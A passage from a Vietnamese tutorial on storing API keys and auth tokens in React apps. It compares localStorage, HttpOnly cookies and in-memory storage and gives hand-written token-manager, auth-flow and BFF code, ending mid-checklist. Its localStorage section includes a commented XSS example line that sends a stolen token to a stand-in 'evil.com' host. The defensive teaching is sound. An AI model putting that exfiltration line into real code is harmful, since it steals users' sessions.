# Sensitive Data Storage Trong React — Deep Dive!

> **Chủ đề**: Where would you store sensitive data like API keys or tokens in a React app?
> **Ngôn ngữ**: Tiếng Việt — giải thích cực kỳ chi tiết!
> **Phương châm**: Tự viết lại bằng tay — KHÔNG dùng thư viện!

---

## Mục Lục

1. [§1. Sensitive Data Là Gì?](#1)
2. [§2. Các Vị Trí Lưu Trữ — So Sánh Chi Tiết!](#2)
3. [§3. Environment Variables — .env Files!](#3)
4. [§4. Token Storage — Cookie vs LocalStorage vs Memory!](#4)
5. [§5. Tự Viết — Secure Token Manager!](#5)
6. [§6. Tự Viết — HTTP-Only Cookie Auth Flow!](#6)
7. [§7. Tự Viết — In-Memory Token Store!](#7)
8. [§8. Backend-For-Frontend (BFF) Pattern!](#8)
9. [§9. Security Checklist & Best Practices!](#9)
10. [§10. Tổng Kết & Câu Hỏi Phỏng Vấn!](#10)

---

## §1. Sensitive Data Là Gì?

### 1.1. Phân Loại Sensitive Data!

```
  SENSITIVE DATA TRONG REACT APP:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  NGUYÊN TẮC SỐ 1:                                     │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │                                                  │  │
  │  │  "CLIENT-SIDE CODE LÀ PUBLIC!"                   │  │
  │  │                                                  │  │
  │  │  Mọi thứ trong React app đều có thể bị:         │  │
  │  │  → Xem qua DevTools (Sources tab)               │  │
  │  │  → Đọc từ bundle.js                             │  │
  │  │  → Intercept qua Network tab                    │  │
  │  │  → Reverse engineer                             │  │
  │  │                                                  │  │
  │  │  → KHÔNG BAO GIỜ lưu secrets ở client!          │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  PHÂN LOẠI:                                            │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │                                                  │  │
  │  │  🔴 TUYỆT ĐỐI KHÔNG LƯU Ở CLIENT:              │  │
  │  │  ① API Secret Keys (Stripe secret, AWS secret)  │  │
  │  │  ② Database credentials (username/password)     │  │
  │  │  ③ Private encryption keys                      │  │
  │  │  ④ Server-side secrets                          │  │
  │  │  ⑤ Third-party secret tokens                    │  │
  │  │                                                  │  │
  │  │  🟡 CẦN BẢO VỆ KHI LƯU Ở CLIENT:               │  │
  │  │  ① Access tokens (JWT)                          │  │
  │  │  ② Refresh tokens                               │  │
  │  │  ③ Session IDs                                  │  │
  │  │  ④ CSRF tokens                                  │  │
  │  │                                                  │  │
  │  │  🟢 CÓ THỂ LƯU Ở CLIENT (public):              │  │
  │  │  ① API public keys (Stripe publishable key)     │  │
  │  │  ② Public API endpoints                         │  │
  │  │  ③ App configuration (non-secret)               │  │
  │  │  ④ Feature flags                                │  │
  │  │                                                  │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 1.2. Tại Sao Client-Side Không An Toàn?

```javascript
// ═══════════════════════════════════════════════════════════
// TẠI SAO REACT APP KHÔNG AN TOÀN CHO SECRETS?
// ═══════════════════════════════════════════════════════════

// ❌ SAI — Hardcode API key trong React:
var API_KEY = "sk_live_abc123_SECRET_KEY";
// → Bất kỳ ai cũng có thể:
// → View Source → tìm thấy key!
// → DevTools → Sources → search "sk_live"!
// → Bundle.js → key nằm trong plain text!

// ❌ SAI — Dùng .env nhưng KHÔNG HIỂU:
// File .env:  REACT_APP_SECRET_KEY=sk_live_abc123
// React build sẽ THAY THẾ biến vào bundle:
// bundle.js: var key = "sk_live_abc123"  ← VẪN LỘ!

// MINH HỌA — Hacker tìm secrets:
// Bước 1: Mở DevTools → Sources tab
// Bước 2: Ctrl+Shift+F (Search all files)
// Bước 3: Tìm "api_key", "secret", "token", "sk_"
// Bước 4: TÌM THẤY! → Dùng key để gọi API miễn phí!

// ═══ DEMO: Mọi thứ trong bundle đều PUBLIC ═══
// React build process:
// .env:           REACT_APP_API_KEY=abc123
//                       ↓ (webpack/vite replace)
// Source code:    process.env.REACT_APP_API_KEY
//                       ↓ (build)
// Bundle.js:     "abc123"   ← PLAIN TEXT!
//                       ↓ (deploy)
// Browser:        ANYONE can read!
```

---

## §2. Các Vị Trí Lưu Trữ — So Sánh Chi Tiết!

```
  CÁC VỊ TRÍ LƯU TRỮ — SO SÁNH TOÀN DIỆN:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Vị trí         XSS?   CSRF?  Persist?  Recommend?    │
  │  ───────────────────────────────────────────────────── │
  │  localStorage   ❌ Lộ   ✅ Safe ✅ Yes    ❌ Tokens     │
  │  sessionStorage ❌ Lộ   ✅ Safe ❌ No     ⚠️ Tạm OK    │
  │  Cookie (JS)    ❌ Lộ   ❌ CSRF ✅ Yes    ❌ Tokens     │
  │  HttpOnly Cookie✅ Safe ❌ CSRF ✅ Yes    ✅ Tokens     │
  │  In-Memory (JS) ✅ Safe*✅ Safe ❌ No     ✅ Short-term │
  │  Server-side    ✅ Safe ✅ Safe ✅ Yes    ✅ Secrets    │
  │  .env (build)   ⚠️ Chú ý     ✅ Yes    🟡 Public only│
  │                                                        │
  │  * In-Memory vẫn có thể bị XSS đọc nếu code bị inject│
  │                                                        │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  KHUYẾN NGHỊ:                                    │  │
  │  │                                                  │  │
  │  │  API Secret Keys → SERVER ONLY!                  │  │
  │  │  Access Tokens   → HttpOnly Cookie hoặc Memory!  │  │
  │  │  Refresh Tokens  → HttpOnly Cookie!              │  │
  │  │  Public API Keys → .env + environment variables! │  │
  │  │  User Preferences → localStorage (non-secret)!  │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```
  DATA FLOW — ĐÚNG CÁCH:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ① API SECRET KEYS:                                    │
  │  ┌──────────┐    ┌──────────┐    ┌──────────────┐     │
  │  │ React    │───→│ Your     │───→│ Third-party  │     │
  │  │ Client   │    │ Server   │    │ API          │     │
  │  │          │    │ (có key) │    │ (Stripe...)  │     │
  │  └──────────┘    └──────────┘    └──────────────┘     │
  │  React KHÔNG       Server giữ      Server gọi API     │
  │  biết key!         secret key!     với key!            │
  │                                                        │
  │  ② ACCESS TOKENS:                                      │
  │  ┌──────────┐    ┌──────────┐    ┌──────────────┐     │
  │  │ React    │───→│ Your     │───→│ Set HttpOnly │     │
  │  │ Login    │    │ Server   │    │ Cookie       │     │
  │  │ Form     │    │ Auth     │    │              │     │
  │  └──────────┘    └──────────┘    └──────────────┘     │
  │  User gõ          Server tạo      Cookie tự động       │
  │  credentials!     token!          gắn vào requests!    │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §3. Environment Variables — .env Files!

### 3.1. Cách Hoạt Động!

```
  .env FILES TRONG REACT:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ⚠️ HIỂU LẦM PHỔ BIẾN:                                │
  │  "Đặt trong .env là an toàn" → SAI!                   │
  │                                                        │
  │  .env CHỈ LÀ CONVENIENCE, KHÔNG PHẢI SECURITY!        │
  │                                                        │
  │  CÁCH HOẠT ĐỘNG:                                       │
  │  ┌──────────┐  build   ┌──────────┐  deploy  ┌─────┐ │
  │  │ .env     │────────→│ bundle.js │────────→│ CDN │  │
  │  │ API_KEY= │ replace │ "abc123" │ upload  │     │  │
  │  │ abc123   │ text    │ hardcode │         │     │  │
  │  └──────────┘         └──────────┘         └─────┘  │
  │                                                        │
  │  → Giá trị từ .env được THAY THẾ vào code lúc build! │
  │  → Bundle.js chứa giá trị PLAIN TEXT!                  │
  │  → Browser đọc được!                                   │
  │                                                        │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  .env CHỈ DÙNG CHO:                              │  │
  │  │  ✅ Public API keys (Stripe publishable)         │  │
  │  │  ✅ API endpoint URLs                            │  │
  │  │  ✅ Feature flags                                │  │
  │  │  ✅ App version, environment name                │  │
  │  │                                                  │  │
  │  │  .env KHÔNG DÙNG CHO:                            │  │
  │  │  ❌ Secret API keys                              │  │
  │  │  ❌ Database passwords                           │  │
  │  │  ❌ Private tokens                               │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```javascript
// ═══════════════════════════════════════════════════════════
// .env USAGE — ĐÚNG VÀ SAI!
// ═══════════════════════════════════════════════════════════

// === FILE: .env ===
// ✅ ĐÚNG — Public keys:
// REACT_APP_API_URL=https://api.myapp.com
// REACT_APP_STRIPE_PUBLIC_KEY=pk_live_abc123
// REACT_APP_GOOGLE_MAPS_KEY=AIza... (restricted by domain)
// REACT_APP_ENV=production

// ❌ SAI — Secret keys:
// REACT_APP_STRIPE_SECRET=sk_live_xxx  ← NGUY HIỂM!
// REACT_APP_DB_PASSWORD=mypassword     ← NGUY HIỂM!
// REACT_APP_JWT_SECRET=supersecret     ← NGUY HIỂM!

// === Sử dụng trong React: ===
var config = {
  apiUrl: process.env.REACT_APP_API_URL, // ✅ OK
  stripeKey: process.env.REACT_APP_STRIPE_PUBLIC_KEY, // ✅ OK
  env: process.env.REACT_APP_ENV, // ✅ OK
};
// Sau khi build, bundle.js sẽ chứa:
// var config = {
//     apiUrl: "https://api.myapp.com",
//     stripeKey: "pk_live_abc123",
//     env: "production"
// };
// → Tất cả đều PUBLIC — phải chấp nhận!

// ═══ CRA vs Vite — Naming Convention: ═══
// Create React App:  REACT_APP_*  prefix
// Vite:              VITE_*       prefix
// Next.js:           NEXT_PUBLIC_* prefix (client)
//                    (no prefix = server only!)
```

---

## §4. Token Storage — Cookie vs LocalStorage vs Memory!

### 4.1. localStorage — Tại Sao KHÔNG Nên?

```javascript
// ═══════════════════════════════════════════════════════════
// localStorage — PHÂN TÍCH CHI TIẾT!
// ═══════════════════════════════════════════════════════════

// ❌ VẤN ĐỀ #1: XSS có thể đọc localStorage!
// Nếu app có lỗ hổng XSS → hacker inject script:
var stolenToken = localStorage.getItem("accessToken");
// → new Image().src = 'https://evil.com/steal?t=' + stolenToken;
// → Hacker có token → đăng nhập bằng account user!

// ❌ VẤN ĐỀ #2: Persistent — token tồn tại MÃI MÃI!
localStorage.setItem("token", "jwt_abc123");
// → Đóng tab, đóng browser → token VẪN CÒN!
// → Máy tính công cộng → người khác đọc được!

// ❌ VẤN ĐỀ #3: Accessible by ANY JavaScript!
// Mọi script trên trang đều đọc được:
// → Third-party scripts (analytics, ads...)
// → Browser extensions
// → Injected scripts (XSS)

// ⚠️ KHI NÀO DÙNG localStorage?
// ✅ User preferences (theme, language)
// ✅ Non-sensitive cached data
// ✅ Shopping cart (non-authenticated)
// ❌ KHÔNG BAO GIỜ lưu tokens!
```

### 4.2. HttpOnly Cookie — Cách An Toàn Nhất!

```
  HttpOnly Cookie — TẠI SAO AN TOÀN?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  JavaScript Cookie (document.cookie):                  │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  document.cookie = "token=abc123"                │  │
  │  │                                                  │  │
  │  │  → JS ĐỌC ĐƯỢC:  document.cookie → "token=..."  │  │
  │  │  → XSS ĐỌC ĐƯỢC: hacker steal cookie!          │  │
  │  │  → KHÔNG AN TOÀN cho tokens!                     │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  HttpOnly Cookie (server-set):                         │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  Set-Cookie: token=abc123; HttpOnly; Secure;     │  │
  │  │             SameSite=Strict; Path=/               │  │
  │  │                                                  │  │
  │  │  → JS KHÔNG ĐỌC ĐƯỢC: document.cookie → ""      │  │
  │  │  → XSS KHÔNG ĐỌC ĐƯỢC!                          │  │
  │  │  → Browser TỰ ĐỘNG gắn vào mọi request!         │  │
  │  │  → AN TOÀN cho tokens!                           │  │
  │  │                                                  │  │
  │  │  FLAGS QUAN TRỌNG:                               │  │
  │  │  HttpOnly → JS không đọc được!                   │  │
  │  │  Secure   → Chỉ gửi qua HTTPS!                  │  │
  │  │  SameSite → Chống CSRF!                          │  │
  │  │    Strict → Chỉ same-origin requests             │  │
  │  │    Lax    → Cho phép top-level navigation        │  │
  │  │    None   → Cross-site (cần Secure)              │  │
  │  │  Path=/   → Áp dụng cho toàn site!               │  │
  │  │  Max-Age  → Thời gian sống!                      │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ⚠️ NHƯỢC ĐIỂM: Dễ bị CSRF nếu không có SameSite!    │
  │  → Giải pháp: SameSite=Strict + CSRF Token!           │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 4.3. In-Memory — Tạm Thời Nhưng An Toàn!

```
  IN-MEMORY TOKEN STORAGE:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  CÁCH HOẠT ĐỘNG:                                       │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  var token = null; // Biến JS trong closure      │  │
  │  │                                                  │  │
  │  │  ✅ ƯU ĐIỂM:                                     │  │
  │  │  → Không lưu ở localStorage/cookie!              │  │
  │  │  → XSS khó đọc hơn (không có API cố định)!      │  │
  │  │  → Tự động xóa khi refresh/close tab!            │  │
  │  │                                                  │  │
  │  │  ❌ NHƯỢC ĐIỂM:                                   │  │
  │  │  → Mất token khi refresh page!                   │  │
  │  │  → User phải login lại!                          │  │
  │  │  → Giải pháp: Kết hợp refresh token (HttpOnly)! │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  PATTERN KẾT HỢP (KHUYẾN NGHỊ):                       │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  Access Token  → In-Memory (short-lived, 15min)  │  │
  │  │  Refresh Token → HttpOnly Cookie (long-lived)    │  │
  │  │                                                  │  │
  │  │  Flow:                                           │  │
  │  │  1. Login → server trả access token in body      │  │
  │  │            + set refresh token in HttpOnly cookie │  │
  │  │  2. React lưu access token trong memory          │  │
  │  │  3. Access token hết hạn → gọi /refresh          │  │
  │  │  4. Server đọc refresh cookie → trả access mới  │  │
  │  │  5. Refresh page → gọi /refresh để lấy lại!     │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §5. Tự Viết — Secure Token Manager!

```javascript
// ═══════════════════════════════════════════════════════════
// SECURE TOKEN MANAGER — TỰ VIẾT!
// Quản lý access token trong memory!
// ═══════════════════════════════════════════════════════════

var SecureTokenManager = (function () {
  // ① PRIVATE STATE — chỉ accessible trong closure:
  var _accessToken = null;
  var _tokenExpiry = null;
  var _refreshTimer = null;
  var _listeners = [];

  // ② SET TOKEN:
  function setToken(token, expiresInSeconds) {
    _accessToken = token;
    _tokenExpiry = Date.now() + expiresInSeconds * 1000;

    // Auto-refresh trước khi hết hạn (1 phút trước):
    clearTimeout(_refreshTimer);
    var refreshDelay = (expiresInSeconds - 60) * 1000;
    if (refreshDelay > 0) {
      _refreshTimer = setTimeout(function () {
        refreshToken();
      }, refreshDelay);
    }

    // Notify listeners:
    notifyListeners();
  }

  // ③ GET TOKEN:
  function getToken() {
    // Kiểm tra hết hạn:
    if (_accessToken && _tokenExpiry && Date.now() >= _tokenExpiry) {
      _accessToken = null;
      _tokenExpiry = null;
      notifyListeners();
      return null;
    }
    return _accessToken;
  }

  // ④ CLEAR TOKEN (logout):
  function clearToken() {
    _accessToken = null;
    _tokenExpiry = null;
    clearTimeout(_refreshTimer);
    notifyListeners();
  }

  // ⑤ REFRESH TOKEN:
  function refreshToken() {
    // Gọi server để lấy access token mới:
    // Server đọc refresh token từ HttpOnly cookie!
    return fetch("/api/auth/refresh", {
      method: "POST",
      credentials: "include", // Gửi cookies!
    })
      .then(function (response) {
        if (!response.ok) {
          clearToken();
          throw new Error("Refresh failed");
        }
        return response.json();
      })
      .then(function (data) {
        setToken(data.accessToken, data.expiresIn);
        return data.accessToken;
      })
      .catch(function (error) {
        clearToken();
        // Redirect to login:
        window.location.href = "/login";
      });
  }

  // ⑥ CHECK AUTHENTICATION:
  function isAuthenticated() {
    return getToken() !== null;
  }

  // ⑦ SUBSCRIBE TO CHANGES:
  function subscribe(listener) {
    _listeners.push(listener);
    return function unsubscribe() {
      _listeners = _listeners.filter(function (l) {
        return l !== listener;
      });
    };
  }

  function notifyListeners() {
    for (var i = 0; i < _listeners.length; i++) {
      _listeners[i](isAuthenticated());
    }
  }

  // ⑧ AUTHENTICATED FETCH — wrapper:
  function authFetch(url, options) {
    options = options || {};
    var token = getToken();

    if (!token) {
      // Thử refresh trước:
      return refreshToken().then(function (newToken) {
        return doFetch(url, options, newToken);
      });
    }
    return doFetch(url, options, token);
  }

  function doFetch(url, options, token) {
    options.headers = options.headers || {};
    options.headers["Authorization"] = "Bearer " + token;
    options.credentials = "include"; // Gửi cookies!

    return fetch(url, options).then(function (response) {
      // 401 = token hết hạn → refresh:
      if (response.status === 401) {
        return refreshToken().then(function (newToken) {
          options.headers["Authorization"] = "Bearer " + newToken;
          return fetch(url, options);
        });
      }
      return response;
    });
  }

  return {
    setToken: setToken,
    getToken: getToken,
    clearToken: clearToken,
    refreshToken: refreshToken,
    isAuthenticated: isAuthenticated,
    subscribe: subscribe,
    authFetch: authFetch,
  };
})();

// ═══ SỬ DỤNG: ═══
// Login:
// fetch('/api/auth/login', { method:'POST', body:... })
//   .then(res => res.json())
//   .then(data => SecureTokenManager.setToken(data.token, 900));

// API calls:
// SecureTokenManager.authFetch('/api/users/me')
//   .then(res => res.json())
//   .then(user => console.log(user));

// Logout:
// SecureTokenManager.clearToken();
```

---

## §6. Tự Viết — HTTP-Only Cookie Auth Flow!

```
  HTTP-ONLY COOKIE AUTH FLOW:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ① LOGIN:                                              │
  │  React ──POST /login──→ Server                         │
  │  { email, password }     │                             │
  │                          ↓                             │
  │                    Validate credentials                │
  │                    Create tokens                       │
  │                          ↓                             │
  │  React ←─── Response ───┘                              │
  │  Body: { user, accessToken }                           │
  │  Set-Cookie: refreshToken=xyz;                         │
  │              HttpOnly; Secure; SameSite=Strict          │
  │                                                        │
  │  ② API REQUEST:                                        │
  │  React ──GET /api/data──→ Server                       │
  │  Header: Authorization: Bearer <accessToken>           │
  │  Cookie: refreshToken=xyz  (auto by browser!)          │
  │                          ↓                             │
  │                    Verify access token                 │
  │                          ↓                             │
  │  React ←─── Response ───┘                              │
  │  Body: { data }                                        │
  │                                                        │
  │  ③ TOKEN REFRESH:                                      │
  │  React ──POST /refresh──→ Server                       │
  │  Cookie: refreshToken=xyz  (auto!)                     │
  │                          ↓                             │
  │                    Verify refresh token                │
  │                    Create new access token             │
  │                          ↓                             │
  │  React ←─── Response ───┘                              │
  │  Body: { accessToken }                                 │
  │  Set-Cookie: refreshToken=new_xyz; HttpOnly            │
  │                                                        │
  │  ④ LOGOUT:                                             │
  │  React ──POST /logout──→ Server                        │
  │                          ↓                             │
  │                    Invalidate refresh token            │
  │                          ↓                             │
  │  React ←─── Response ───┘                              │
  │  Set-Cookie: refreshToken=; Max-Age=0  (XÓA!)         │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```javascript
// ═══════════════════════════════════════════════════════════
// SERVER-SIDE — Express.js (để hiểu flow):
// ═══════════════════════════════════════════════════════════

// (Server code — KHÔNG chạy ở React!)
// Chỉ để hiểu cách server set HttpOnly cookies:

function serverLoginHandler(req, res) {
  // Verify credentials...
  var user = authenticateUser(req.body.email, req.body.password);

  // Tạo tokens:
  var accessToken = createJWT(user, "15m"); // 15 phút
  var refreshToken = createJWT(user, "7d"); // 7 ngày

  // Lưu refresh token vào database:
  saveRefreshToken(user.id, refreshToken);

  // Set HttpOnly cookie (QUAN TRỌNG!):
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true, // ← JS KHÔNG ĐỌC ĐƯỢC!
    secure: true, // ← Chỉ HTTPS!
    sameSite: "Strict", // ← Chống CSRF!
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
    path: "/api/auth", // ← Chỉ gửi cho auth endpoints!
  });

  // Trả access token trong body (React lưu trong memory):
  res.json({
    user: { id: user.id, name: user.name },
    accessToken: accessToken,
    expiresIn: 900, // 15 phút = 900 giây
  });
}

// ═══ CLIENT-SIDE — React Auth Service: ═══

var AuthService = (function () {
  function login(email, password) {
    return fetch("/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include", // GỬI VÀ NHẬN cookies!
      body: JSON.stringify({ email: email, password: password }),
    })
      .then(function (res) {
        if (!res.ok) throw new Error("Login failed");
        return res.json();
      })
      .then(function (data) {
        // Lưu access token trong MEMORY (không localStorage!):
        SecureTokenManager.setToken(data.accessToken, data.expiresIn);
        return data.user;
      });
  }

  function logout() {
    return fetch("/api/auth/logout", {
      method: "POST",
      credentials: "include", // Gửi cookie để server xóa!
    }).then(function () {
      SecureTokenManager.clearToken();
      window.location.href = "/login";
    });
  }

  // Gọi khi app khởi động (refresh page):
  function initialize() {
    // Thử refresh token để lấy access token mới:
    return SecureTokenManager.refreshToken().catch(function () {
      // Refresh failed → user chưa login
      return null;
    });
  }

  return { login: login, logout: logout, initialize: initialize };
})();
```

---

## §7. Tự Viết — In-Memory Token Store!

```javascript
// ═══════════════════════════════════════════════════════════
// IN-MEMORY TOKEN STORE — REACT HOOKS!
// Custom hooks để quản lý auth state!
// ═══════════════════════════════════════════════════════════

// ① AUTH CONTEXT — Provider pattern:
var AuthContext = React.createContext(null);

function AuthProvider(props) {
  var stateHook = React.useState({
    user: null,
    isAuthenticated: false,
    isLoading: true,
  });
  var state = stateHook[0];
  var setState = stateHook[1];

  // Initialize — check auth on mount:
  React.useEffect(function () {
    AuthService.initialize()
      .then(function (user) {
        setState({
          user: user,
          isAuthenticated: !!user,
          isLoading: false,
        });
      })
      .catch(function () {
        setState({
          user: null,
          isAuthenticated: false,
          isLoading: false,
        });
      });
  }, []);

  // Subscribe to token changes:
  React.useEffect(function () {
    var unsubscribe = SecureTokenManager.subscribe(function (isAuth) {
      if (!isAuth) {
        setState({
          user: null,
          isAuthenticated: false,
          isLoading: false,
        });
      }
    });
    return unsubscribe;
  }, []);

  var contextValue = {
    user: state.user,
    isAuthenticated: state.isAuthenticated,
    isLoading: state.isLoading,
    login: function (email, password) {
      return AuthService.login(email, password).then(function (user) {
        setState({
          user: user,
          isAuthenticated: true,
          isLoading: false,
        });
        return user;
      });
    },
    logout: function () {
      return AuthService.logout();
    },
  };

  return {
    $$typeof: Symbol.for("react.element"),
    type: AuthContext.Provider,
    props: {
      value: contextValue,
      children: props.children,
    },
  };
}

// ② CUSTOM HOOK:
function useAuth() {
  var context = React.useContext(AuthContext);
  if (!context) {
    throw new Error("useAuth phải dùng trong AuthProvider!");
  }
  return context;
}

// ③ PROTECTED ROUTE component:
function ProtectedRoute(props) {
  var auth = useAuth();

  if (auth.isLoading) {
    return {
      $$typeof: Symbol.for("react.element"),
      type: "div",
      props: { children: "Loading..." },
    };
  }

  if (!auth.isAuthenticated) {
    // Redirect to login:
    window.location.href = "/login";
    return null;
  }

  return props.children;
}
```

```
  AUTH FLOW HOÀN CHỈNH — SƠ ĐỒ:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ┌─────────────────┐                                   │
  │  │  App Start       │                                   │
  │  │  (Refresh Page)  │                                   │
  │  └────────┬────────┘                                   │
  │           ↓                                            │
  │  ┌─────────────────┐    ┌──────────────────┐          │
  │  │ POST /refresh   │───→│ Server checks    │          │
  │  │ Cookie: refresh │    │ HttpOnly cookie  │          │
  │  │ Token (auto!)   │    │                  │          │
  │  └─────────────────┘    └────────┬─────────┘          │
  │                                  ↓                     │
  │                    ┌───── Valid? ─────┐                │
  │                    ↓ YES             ↓ NO              │
  │           ┌────────────────┐  ┌────────────┐          │
  │           │ Return new     │  │ Redirect   │          │
  │           │ access token   │  │ to /login  │          │
  │           │ (in body)      │  │            │          │
  │           └───────┬────────┘  └────────────┘          │
  │                   ↓                                    │
  │           ┌────────────────┐                           │
  │           │ Store in       │                           │
  │           │ MEMORY only!   │                           │
  │           │ (closure var)  │                           │
  │           └───────┬────────┘                           │
  │                   ↓                                    │
  │           ┌────────────────┐                           │
  │           │ App ready!     │                           │
  │           │ Use authFetch  │                           │
  │           │ for API calls  │                           │
  │           └────────────────┘                           │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §8. Backend-For-Frontend (BFF) Pattern!

```
  BFF PATTERN — GIẢI PHÁP TỐI ƯU:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  VẤN ĐỀ: React cần gọi third-party APIs              │
  │  nhưng KHÔNG được lộ API secret keys!                  │
  │                                                        │
  │  GIẢI PHÁP: Backend-For-Frontend (BFF)                │
  │                                                        │
  │  ❌ KHÔNG LÀM:                                         │
  │  ┌──────────┐  secret key  ┌──────────────┐           │
  │  │ React    │─────────────→│ Stripe API   │           │
  │  │ Client   │  (LỘ KEY!)   │              │           │
  │  └──────────┘              └──────────────┘           │
  │                                                        │
  │  ✅ LÀM ĐÚNG:                                          │
  │  ┌──────────┐  no key  ┌──────┐  secret  ┌────────┐  │
  │  │ React    │─────────→│ BFF  │─────────→│ Stripe │  │
  │  │ Client   │ /pay     │Server│ sk_live  │ API    │  │
  │  └──────────┘          └──────┘          └────────┘  │
  │  React CHỈ gọi       BFF giữ key       BFF gọi API   │
  │  BFF server!          an toàn!          với key!       │
  │                                                        │
  │  BFF SERVER LÀM GÌ:                                   │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ① Giữ TẤT CẢ secret keys ở server             │  │
  │  │  ② Nhận requests từ React (không có key)         │  │
  │  │  ③ Thêm API keys vào requests                   │  │
  │  │  ④ Forward đến third-party APIs                 │  │
  │  │  ⑤ Filter response (chỉ trả data cần thiết)     │  │
  │  │  ⑥ Validate & sanitize input                    │  │
  │  │  ⑦ Rate limiting                                │  │
  │  │  ⑧ Logging & monitoring                         │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

```javascript
// ═══════════════════════════════════════════════════════════
// BFF PATTERN — CODE MẪU!
// ═══════════════════════════════════════════════════════════

// === SERVER (BFF) — Express.js: ===
// (Server code — để hiểu pattern)

function bffPaymentHandler(req, res) {
  // ① Validate request từ React:
  if (!req.body.amount || !req.body.currency) {
    return res.status(400).json({ error: "Invalid request" });
  }

  // ② Rate limiting: (tự viết đơn giản)
  var clientIP = req.ip;
  var now = Date.now();
  if (rateLimitMap[clientIP] && now - rateLimitMap[clientIP] < 1000) {
    return res.status(429).json({ error: "Too many requests" });
  }
  rateLimitMap[clientIP] = now;

  // ③ Thêm SECRET KEY (chỉ ở server!):
  fetch("https://api.stripe.com/v1/charges", {
    method: "POST",
    headers: {
      Authorization: "Bearer " + process.env.STRIPE_SECRET_KEY,
      // ↑ KEY CHỈ NẰM Ở SERVER!
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "amount=" + req.body.amount + "&currency=" + req.body.currency,
  })
    .then(function (stripeRes) {
      return stripeRes.json();
    })
    .then(function (data) {
      // ④ Filter response — chỉ trả data cần thiết:
      res.json({
        success: true,
        chargeId: data.id,
        status: data.status,
        // KHÔNG trả: data.source, data.customer details...
      });
    });
}

// === CLIENT (React) — KHÔNG CÓ KEY: ===
function PaymentButton(props) {
  function handlePayment() {
    // Gọi BFF — KHÔNG GỬI KEY:
    fetch("/api/payment/charge", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({
        amount: props.amount,
        currency: "usd",
        // KHÔNG CÓ API KEY!
      }),
    })
      .then(function (res) {
        return res.json();
      })
      .then(function (data) {
        if (data.success) alert("Payment successful!");
      });
  }
  return {
    $$typeof: Symbol.for("react.element"),
    type: "button",
    props: { onClick: handlePayment, children: "Pay Now" },
  };
}
```

---

## §9. Security Checklist & Best Practices!

```
  SECURITY CHECKLIST — REACT APP:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ✅ API KEYS & SECRETS:                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  □ Secret keys CHỈ lưu ở server (never client)  │  │
  │  │  □ Dùng BFF pattern cho third-party APIs         │  │
  │  │  □ .env chỉ chứa public keys                    │  │
  │  │  □ .env KHÔNG commit vào Git (.gitignore)        │  │
  │  │  □ Dùng CI/CD env vars cho production            │  │
  │  │  □ Rotate keys định kỳ                          │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ✅ TOKENS & AUTHENTICATION:                           │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  □ Access token: in-memory (short-lived, 15min)  │  │
  │  │  □ Refresh token: HttpOnly+Secure+SameSite cookie│  │
  │  │  □ KHÔNG lưu tokens trong localStorage           │  │
  │  │  □ Auto-refresh trước khi access token hết hạn  │  │
  │  │  □ Invalidate refresh token khi logout           │  │
  │  │  □ credentials:'include' trong fetch             │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ✅ XSS PREVENTION:                                    │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  □ Không dùng dangerouslySetInnerHTML với        │  │
  │  │    user input (nếu dùng → sanitize!)             │  │
  │  │  □ Sanitize mọi HTML từ API                     │  │
  │  │  □ Validate input ở cả client VÀ server          │  │
  │  │  □ Set CSP headers                              │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ✅ CSRF PREVENTION:                                   │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  □ SameSite=Strict trên cookies                 │  │
  │  │  □ CSRF token cho state-changing requests        │  │
  │  │  □ Verify Origin/Referer headers ở server        │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  ✅ HTTPS & HEADERS:                                   │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  □ Luôn dùng HTTPS (redirect HTTP → HTTPS)      │  │
